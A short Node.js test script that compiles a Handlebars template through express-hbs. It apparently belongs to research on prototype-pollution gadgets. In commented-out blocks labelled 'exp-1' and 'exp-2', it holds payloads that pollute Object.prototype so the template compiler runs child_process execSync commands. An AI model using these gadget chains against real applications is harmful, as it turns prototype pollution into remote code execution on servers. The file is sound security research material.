const hbs = require('express-hbs');

// exp-1
// Object.prototype.type = 'Program';
// Object.prototype.body = [{
//     "type": "MustacheStatement",
//     "path": 0,
//     "params": [{
//         "type": "NumberLiteral",
//         "value": "console.log(process.mainModule.require('child_process').execSync('sleep 10').toString())"
//     }],
//     "loc": {
//         "start": 0,
//         "end": 0
//     }
// }];

// for node-find-undefined
console.log("===========start===========")

const source = `Hello {{ msg }}`;
const template =  hbs.handlebars.compile(source);

console.log(template.toString())
console.log(template({msg:"World!"}))


// exp-2
// Object.prototype.children=[{
//     "opcodes": ["123"],
//     "children": [],
//     "blockParams": 1
//     }]
// Object.prototype.posts={
//         "type": "browse"
//         },
// Object.prototype.resource="constructor",
// Object.prototype.type="constructor",
// Object.prototype.program={
//         "opcodes": [{
//         "opcode": "pushLiteral",
//         "args": ["1"]
//         }, {
//         "opcode": "appendEscaped",
//         "args": ["1"]
//         }],
//         "children": [],
//         "blockParams": "global.process.mainModule.constructor._load('child_process').execSync('sleep 10')"}
// Object.prototype.options=";"
// Object.prototype.meta={
//         "pagination": {
//         "pages": "100"
//         }
//     }


// const source = `foo{{> emptyComment}}`
// const template =  hbs.handlebars.compile(source);

// console.log(template.toString())
// console.log(template({msg:"World!"}))

// for node-find-undefined
console.log("===========end===========")